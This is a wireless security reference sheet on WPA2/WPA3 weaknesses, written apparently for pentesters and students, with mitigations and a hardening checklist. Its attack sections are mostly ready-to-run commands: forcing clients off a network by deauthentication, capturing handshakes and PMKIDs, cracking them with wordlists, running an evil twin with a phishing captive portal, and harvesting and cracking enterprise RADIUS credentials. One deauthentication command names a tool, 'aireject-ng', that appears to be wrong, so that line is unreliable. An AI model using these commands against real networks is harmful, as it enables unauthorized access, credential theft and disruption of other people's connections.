# Wireless Security (802.11)

## Protocol Evolution

| Standard | Security | Encryption | Status |
|----------|----------|-----------|--------|
| WEP | Broken | RC4 (24-bit IV) | Deprecated — crackable in minutes |
| WPA | Weak | TKIP (RC4-based) | Deprecated |
| WPA2-Personal | Good | AES-CCMP (PSK) | Current — vulnerable to KRACK, PMKID |
| WPA2-Enterprise | Strong | AES-CCMP (802.1X/RADIUS) | Current standard |
| WPA3-Personal | Strong | SAE (Dragonfly) | Latest — resistant to offline dict. attacks |
| WPA3-Enterprise | Strongest | AES-GCMP-256 (192-bit mode) | Latest enterprise |

## Attack Taxonomy

### 1. WPA2-PSK Cracking

#### 4-Way Handshake Capture
```bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon

# Target specific AP and capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth client to force re-authentication (speeds up handshake capture)
sudo aireject-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Crack with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Crack with hashcat (much faster with GPU)
# Convert to hashcat format first
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

#### PMKID Attack (Clientless)
```bash
# No need to wait for handshake — request PMKID from AP directly
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng

# Convert and crack
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

### 2. Evil Twin Attack
```bash
# Create rogue AP mimicking target
# Tool: hostapd-wpe, wifiphisher, or manual hostapd

# hostapd.conf for evil twin:
# interface=wlan0
# driver=nl80211
# ssid=TargetNetwork
# channel=6
# hw_mode=g
# ieee80211n=1

# Start DHCP server on rogue AP
sudo dnsmasq -i wlan0 -d --dhcp-range=10.0.0.10,10.0.0.100

# Captive portal to harvest credentials
# Serve phishing page on 10.0.0.1:80
```

### 3. KRACK Attack (Key Reinstallation Attack)
- Targets WPA2 4-way handshake
- Forces nonce reuse → keystream reuse
- Can decrypt packets, inject frames
- **Mitigation**: Update firmware/drivers (patched in most implementations)

### 4. WPA3 Dragonblood Attacks
- Side-channel attacks on SAE (Simultaneous Authentication of Equals)
- Timing attacks leak password group information
- Downgrade attacks force WPA2 fallback
- **Mitigation**: Updated WPA3 implementations, disable transition mode

### 5. Rogue Access Point Detection
```bash
# Scan for unauthorized APs
sudo airodump-ng wlan0mon --manufacturer

# Compare against known AP inventory (BSSID whitelist)
# Alert on: unknown BSSIDs, duplicate SSIDs, unexpected channels

# Enterprise: Use WIDS/WIPS (Cisco CleanAir, Aruba RFProtect)
```

## Enterprise Wireless Security (802.1X / EAP)

### EAP Methods
| Method | Security | Client Cert | Server Cert | Use Case |
|--------|----------|-------------|-------------|----------|
| EAP-TLS | Highest | Required | Required | Enterprise (strongest) |
| EAP-TTLS | High | Optional | Required | RADIUS with inner auth |
| PEAP (MSCHAPv2) | Medium | No | Required | Windows environments |
| EAP-FAST | Medium | Optional | Optional | Cisco environments |

### Attack: RADIUS Credential Harvesting
```bash
# Using hostapd-wpe (enterprise evil twin)
# Captures RADIUS challenge/response (MSCHAPv2)
sudo hostapd-wpe hostapd-wpe.conf

# Captured hashes can be cracked:
# NetNTLMv1 → DES-based (trivially crackable)
# MSCHAPv2 → crackable with asleap or hashcat

asleap -C <challenge> -R <response> -W wordlist.txt
# or
hashcat -m 5500 captured_hash.txt wordlist.txt
```

### Mitigation: EAP-TLS
```
Requires mutual certificate authentication:
- Client must have valid cert signed by enterprise CA
- Server must have valid cert (client verifies!)
- No passwords transmitted → immune to credential harvesting
- Requires PKI infrastructure (cert provisioning for all devices)
```

## Wireless Pentesting Methodology

```
1. Reconnaissance
   ├── Identify target SSIDs, BSSIDs, channels
   ├── Determine security protocol (WPA2/WPA3/Enterprise)
   ├── Map AP locations (signal strength triangulation)
   └── Identify clients and probe requests

2. Vulnerability Assessment
   ├── Check for WPA2-PSK (dictionary-attackable?)
   ├── Check for WPS enabled (brute-forceable PIN)
   ├── Check for management frame protection (802.11w)
   ├── Check for enterprise misconfigurations
   └── Check for rogue APs / evil twins

3. Exploitation
   ├── Handshake capture + offline cracking
   ├── PMKID extraction (clientless)
   ├── Evil twin + captive portal
   ├── Deauth DoS (if 802.11w not enabled)
   └── Enterprise credential harvesting

4. Post-Exploitation
   ├── Network access + lateral movement
   ├── ARP spoofing / MITM on wireless segment
   ├── DNS poisoning via rogue DHCP
   └── Credential sniffing (if HTTP traffic)
```

## Tools Reference

| Tool | Purpose |
|------|---------|
| aircrack-ng suite | WEP/WPA cracking, packet injection |
| hcxtools/hcxdumptool | PMKID capture, hash conversion |
| hashcat | GPU-accelerated password cracking |
| Wireshark | Wireless packet analysis |
| hostapd-wpe | Evil twin for enterprise networks |
| wifiphisher | Automated evil twin + phishing |
| Kismet | Wireless detection/IDS |
| Reaver/Bully | WPS PIN brute force |
| mdk4 | 802.11 DoS testing |
| Fern Wifi Cracker | GUI wireless auditing |

## Wireless Hardening Checklist

- [ ] Use WPA3-SAE (personal) or WPA3-Enterprise 192-bit
- [ ] Enable 802.11w (Management Frame Protection)
- [ ] Disable WPS (Wi-Fi Protected Setup)
- [ ] Use 802.1X/EAP-TLS for enterprise
- [ ] Implement WIDS/WIPS for rogue AP detection
- [ ] Segment wireless traffic (separate VLAN from internal)
- [ ] Rotate PSK regularly (if WPA2-Personal required)
- [ ] Disable SSID broadcasting (minor, easily bypassed)
- [ ] Use strong passphrases (20+ chars for WPA2-PSK)
- [ ] Monitor for deauth floods and probe request anomalies
